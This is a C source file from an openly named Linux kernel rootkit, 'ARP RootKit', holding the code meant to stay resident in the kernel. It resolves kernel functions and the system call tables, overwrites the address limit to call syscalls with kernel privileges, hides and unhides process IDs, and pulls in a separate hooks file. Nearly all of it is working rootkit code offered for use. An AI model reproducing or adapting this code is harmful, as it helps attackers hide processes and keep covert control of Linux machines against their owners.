/***
 *      _  __  __     __
 *     /_) )_) )_)    )_) _   _  _)_ )_/ o _)_
 *    / / / \ /      / \ (_) (_) (_ /  ) ( (_
 *
 *//* License
 *
 * Copyright (c) 2018 Abel Romero Pérez aka D1W0U <abel@abelromero.com>
 *
 * This file is part of ARP RootKit.
 *
 * ARP RootKit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * ARP RootKit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with ARP RootKit.  If not, see <http://www.gnu.org/licenses/>.
 *
 *//* Notes
 *
 * Only this is what will get resident in the Linux Kernel.
 *
 */

#define LABEL(name) asm( \
"\t.globl\t"#name"\n" \
"\t.type\t"#name", @function\n" \
#name":\n" \
"\t.size\t"#name", .-"#name"\n" \
);

/*
 * Our Kernel begins here.
 */
LABEL(kernel_start)

#include <net/sock.h>
#include <linux/skbuff.h>
#include <linux/utsname.h>
#include <asm/mman.h>

#include "kernel.h"

#define LOG_LINE_MAX PAGE_SIZE

/*
 * Types
 */

/*
 * Function declarations.
 */
int pinfo(const char *fmt, ...);
int perr(const char *fmt, ...);
int vpfd(int fd, const char *fmt, va_list args);
//void *readfile(const char *file, size_t *len);
struct task_struct *get_current_task(void);
mm_segment_t my_get_fs(void);
void my_set_fs(mm_segment_t seg);
unsigned int get_kernel_tree(void);

// linked-list
int hide_pid(pid_t pid);
int unhide_pid(pid_t pid);

/*
 * Global variables.
 */
void *kernel_addr = NULL;
size_t kernel_len = 0, kernel_paglen = 0, kernel_pages = 0;
void **my_ia32sct = NULL;
void **my_sct = NULL;
void **sys_call_table = NULL;
void **ia32_sys_call_table = NULL;
unsigned int *psct_fastpath = NULL;
unsigned int *psct_slowpath = NULL;
unsigned int *pia32sct = NULL;
unsigned int kernel_tree = 0;
mm_segment_t *addr_limit = 0;
long *sct_refs = NULL, *ia32sct_refs = NULL;
size_t nsct_refs = 0, nia32sct_refs = 0;

// function variables
int (*tr_sock_recvmsg)(struct socket *sock, struct msghdr *msg, int flags) = NULL;
void * (*f_kmalloc)(size_t size, gfp_t flags) = NULL;
void (*f_kfree)(const void *) = NULL;
struct pid * (*f_find_vpid)(pid_t nr) = NULL;
int (*f_vscnprintf)(char *buf, size_t size, const char *fmt, va_list args) = NULL;
int (*f_sys_write)(int fd, const char *mem, size_t len) = NULL;
int (*f_printk)(const char *fmt, ...) = NULL;
struct socket * (*f_sockfd_lookup)(int fd, int *err) = NULL;
long (*f_probe_kernel_write)(void *dst, const void *src, size_t len) = NULL;
int (*f_strncmp)(const char *s1, const char *s2, size_t len) = NULL;
struct file * (*f_fget)(unsigned int fd) = NULL;
void (*f_fput)(struct file *) = NULL;
struct socket * (*f_sock_from_file)(struct file *file, int *err) = NULL;
size_t (*f_strlen)(const char *) = NULL;
int (*f_kstrtoull)(const char *s, unsigned int base, unsigned long long *res) = NULL;
void * (*f_memcpy)(void *dest, const void *src, size_t count) = NULL;
void (*f_skb_prepare_seq_read)(struct sk_buff *skb, unsigned int from,
			  unsigned int to, struct skb_seq_state *st) = NULL;
unsigned int (*f_skb_seq_read)(unsigned int consumed, const u8 **data,
			  struct skb_seq_state *st) = NULL;
void (*f_skb_abort_seq_read)(struct skb_seq_state *st) = NULL;

/*
 * RootKit's functions definitions.
 */
void kernel_test(void) {
	pinfo("Hello from ARP RK Kernel!\n");
	pinfo("This is the test function.\n\n");
	pinfo("sys_call_table      = %lx\n", sys_call_table);
	pinfo("ia32_sys_call_table = %lx\n", ia32_sys_call_table);
	pinfo("my_sct              = %lx\n", my_sct);
	pinfo("my_ia32sct          = %lx\n", my_ia32sct);

	pinfo("Probably if you arrived here, I'm going to work fine! =)\n");
}

int hide_pid(pid_t nr) {
	struct pid *pid;
	
	pid = f_find_vpid(nr);
	if (pid) {
		if (pid_list_find(nr)) {
			perr("PID %d already hidden.\n", nr);
		} else {
			pid_list_push(nr);
			pinfo("PID %d is hidden.\n", nr);
			return 0;
		}
	} else {
		perr("PID %d not found.\n", nr);
	}

	return -1;
}

int unhide_pid(pid_t nr) {
	if (pid_list_pop(nr) == nr) {
		pinfo("PID %d unhidden.\n", nr);

		return 0;
	} else {
		perr("PID %d is not hidden.\n", nr);
	}
	
	return -1;
}

/*
void *readfile(const char *file, size_t *len) {
	int fd;
	void *buf;
	struct stat fd_st;

	mm_segment_t old_fs = my_get_fs();
	my_set_fs(KERNEL_DS);
	fd = open(file, O_RDONLY, 0);
	if (fd >= 0) {
		newfstat(fd, &fd_st);
		buf = kmalloc(fd_st.st_size, GFP_KERNEL);
		if (buf) {
			if (read(fd, buf, fd_st.st_size) == fd_st.st_size) {
				*len = fd_st.st_size;
				close(fd);
				return buf;
			} else {
				perr("can't read lkm");
			}
		} else {
			perr("create_load_info kmalloc error");
		}

		close(fd);
	} else {
		perr("can't open lkm");
	}
	my_set_fs(old_fs);

	return NULL;
}
*/

int pinfo(const char *fmt, ...) {
    va_list args;
	int ret;

    va_start(args, fmt);
    ret = vpfd(1, fmt, args);
    va_end(args);
	return ret;
}

int perr(const char *fmt, ...) {
    va_list args;
    int ret;

    va_start(args, fmt);
    ret = vpfd(2, fmt, args);
    va_end(args);
    return ret;
}

int vpfd(int fd, const char *fmt, va_list args) {
    char *textbuf = NULL;
    size_t len = 0;
	mm_segment_t old_fs;

	textbuf = f_kmalloc(LOG_LINE_MAX, GFP_KERNEL);
	if (textbuf) {
		len = f_vscnprintf(textbuf, LOG_LINE_MAX, fmt, args);
		if (sys_call_table != NULL) {
			len = KSYSCALL(__NR_write, fd, textbuf, len, 0, 0, 0);
		} else if (f_sys_write != NULL) {
			old_fs = my_get_fs();
			my_set_fs(KERNEL_DS);
			len = f_sys_write(fd, textbuf, len);
			my_set_fs(old_fs);
		}
		f_kfree(textbuf);
		return len;
	} else {
		return -1;
	}
}

long syscall(void **sct, int nr, bool user, long a1, long a2, long a3, long a4, long a5, long a6) {
	long (*f)(long, long, long, long, long, long) = NULL, ret = 0;
	mm_segment_t old_fs;

	if (sct != NULL) {
		f = sct[nr];
		if (user) {
			return f(a1, a2, a3, a4, a5, a6);
		} else {
			old_fs = my_get_fs();
			my_set_fs(KERNEL_DS);
			ret = f(a1, a2, a3, a4, a5, a6);
			my_set_fs(old_fs);
			return ret;
		}
	} else {
		return -1;
	}
}

struct task_struct *get_current_task(void) {
	struct task_struct *cts = NULL;
	asm("movq\t%%gs:current_task, %0" : "=r" (cts));
	return cts;
}

unsigned int get_kernel_tree(void) {
	int i;
	char release[20];
	char *p;
	unsigned long long int tree = 0;

	if (f_strlen(init_uts_ns.name.release) > sizeof(release)) {
		f_memcpy(release, init_uts_ns.name.release, sizeof(release));
		release[sizeof(release)] = 0;
	} else {
		f_memcpy(release, init_uts_ns.name.release, f_strlen(init_uts_ns.name.release));
		release[f_strlen(init_uts_ns.name.release)] = 0;
	}
	
	p = release;
	for (i = 0; i < sizeof(release); i++) {
		if (release[i] == '.') {
			release[i] = 0;
		}
	}
	p += f_strlen(p) + 1;
	f_kstrtoull(p, 10, &tree);

	return (unsigned int)tree;
}

inline mm_segment_t my_get_fs(void) {
	return *(mm_segment_t *)addr_limit;
}

inline void my_set_fs(mm_segment_t seg) {
	*(mm_segment_t *)addr_limit = seg;
}

/*
 * Hook handlers.
 */
#include "hooks.c"
#include "queue.c"

LABEL(kernel_end)
/*
 * Kernel ends here.
 *
 * IMPORTANT: DON'T add code below here. It won't get copied nor accesible.
 */
